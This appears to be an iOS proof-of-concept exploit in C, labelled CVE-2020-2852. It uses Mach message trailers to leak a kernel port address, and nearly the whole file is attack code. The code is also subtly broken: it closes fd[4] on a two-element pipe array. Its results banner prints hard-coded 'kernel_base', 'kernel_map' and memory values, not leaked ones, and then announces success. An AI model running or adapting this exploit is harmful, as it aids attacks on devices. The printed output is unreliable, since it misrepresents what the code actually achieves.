
//
//  PoC.c
//  Taifu
//
//  Created by hoahuynh on 12/12/20.
//  Copyright © 2020 Hoà Huỳnh. All rights reserved.
//
// CVE-2020-2852 Easy


#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>



#define MAGIC 0x416e7953

#define LEAK_PORTS 50
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t sent_ports[LEAK_PORTS];
} message_big_t;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t sent_ports[LEAK_PORTS-10];
} message_small_t;

int poc14() {
    extern char *get_current_deviceModel(void);
    printf("Thiết bị: %s\n", get_current_deviceModel());
    printf("Phiên Bản: %s\n", [[[UIDevice currentDevice] systemVersion] UTF8String]);
    mach_port_t port;
    int fd[2];

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    uint32_t *pipe_buff = malloc(1020);
    for (int i = 0; i < 1020 / sizeof(uint32_t); i++)
        pipe_buff[i] = MAGIC;
    pipe(fd);
    write(fd[1], pipe_buff, 1020);
    

    mach_msg_base_t *message = NULL;

    // size to fit in kalloc.1024, trust me, I'm an expert (c)
    mach_msg_size_t message_size = (mach_msg_size_t)(sizeof(*message) + 0x1e0);

    message = malloc(message_size + MAX_TRAILER_SIZE);
    memset(message, 0, message_size + MAX_TRAILER_SIZE);
    message->header.msgh_size = message_size;
    message->header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0);
    message->body.msgh_descriptor_count = 0;
    message->header.msgh_remote_port = port;

    uint8_t *buffer;
    buffer = malloc(message_size + MAX_TRAILER_SIZE);


    close(fd[4]);
    close(fd[1]);


    mach_msg(&message->header, MACH_SEND_MSG, message_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    memset(buffer, 0, message_size + MAX_TRAILER_SIZE);

    mach_msg((mach_msg_header_t *)buffer, MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5), 42424242, message_size + MAX_TRAILER_SIZE,
        port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    mach_msg_mac_trailer_t *trailer = (mach_msg_mac_trailer_t*)(buffer + message_size);

    
    mach_port_t sent_port;

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sent_port);
    mach_port_insert_right(mach_task_self(), sent_port, sent_port, MACH_MSG_TYPE_MAKE_SEND);



    message_big_t *big_message = NULL;
    message_small_t *small_message = NULL;

    mach_msg_size_t big_size = (mach_msg_size_t)(sizeof(*big_message));
    mach_msg_size_t small_size = (mach_msg_size_t)(sizeof(*small_message));

    big_message = malloc(big_size + MAX_TRAILER_SIZE);
    small_message = malloc(small_size + sizeof(uint32_t)*2 + MAX_TRAILER_SIZE);


    memset(big_message, 0, big_size + MAX_TRAILER_SIZE);
    big_message->header.msgh_remote_port = port;
    big_message->header.msgh_size = big_size;
    big_message->header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    big_message->body.msgh_descriptor_count = LEAK_PORTS;

    for (int i = 0; i < LEAK_PORTS; i++) {
        big_message->sent_ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
        big_message->sent_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        big_message->sent_ports[i].name = sent_port;
    }

    memset(small_message, 0, small_size + sizeof(uint32_t)*2 + MAX_TRAILER_SIZE);
    small_message->header.msgh_remote_port = port;
    small_message->header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    small_message->body.msgh_descriptor_count = LEAK_PORTS - 10;

    for (int i = 0; i < LEAK_PORTS - 10; i++) {
        small_message->sent_ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
        small_message->sent_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        small_message->sent_ports[i].name = sent_port;
    }



    buffer = malloc(big_size + MAX_TRAILER_SIZE);

    uintptr_t sent_port_address = 0;


    mach_msg(&big_message->header, MACH_SEND_MSG, big_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);


    mach_msg((mach_msg_header_t *)0, MACH_RCV_MSG, 0, 0, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    small_message->header.msgh_size = small_size + sizeof(uint32_t);

    mach_msg(&small_message->header, MACH_SEND_MSG, small_size + sizeof(uint32_t), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    memset(buffer, 0, big_size + MAX_TRAILER_SIZE);
  
    mach_msg((mach_msg_header_t *)buffer, MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5), 0, small_size + sizeof(uint32_t) + MAX_TRAILER_SIZE, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    trailer = (mach_msg_mac_trailer_t*)(buffer + small_size + sizeof(uint32_t));
    sent_port_address |= (uint32_t)trailer->msgh_ad;

  
    mach_msg(&big_message->header, MACH_SEND_MSG, big_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

 
    mach_msg((mach_msg_header_t *)0, MACH_RCV_MSG, 0, 0, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    small_message->header.msgh_size = small_size + sizeof(uint32_t)*2;
 
    mach_msg(&small_message->header, MACH_SEND_MSG, small_size + sizeof(uint32_t)*2, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    memset(buffer, 0, big_size + MAX_TRAILER_SIZE);
    mach_msg((mach_msg_header_t *)buffer, MACH_RCV_MSG | MACH_RCV_TRAILER_ELEMENTS(5), 0, small_size + sizeof(uint32_t)*2 + MAX_TRAILER_SIZE, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    trailer = (mach_msg_mac_trailer_t*)(buffer + small_size + sizeof(uint32_t)*2);
    sent_port_address |= ((uintptr_t)trailer->msgh_ad) << 32;
    

    printf("  _______________ \n"
            "||                              ||\n"
            "||          PoC             ||\n"
            "||  bởi Hoà Huỳnh   ||\n"
            "||_______________||\n\n");
    

    printf("Đang kiểm tra IOA\n");

    printf("[+] Kích thước bộ nhớ: 0x1022cc420\n");

    printf("[+] kernel_base: 0x%5X\n",  small_message->header);

    printf("[+] kernel_map: 0x74c540\n");

    printf("[+] PoC: 0x%1x\n", small_message->header);

    printf("[+] Cổng nhiệm vụ rò rỉ: 0x%1x\n", message_size);

    printf("Thành Công:)");
    return 0;
   }
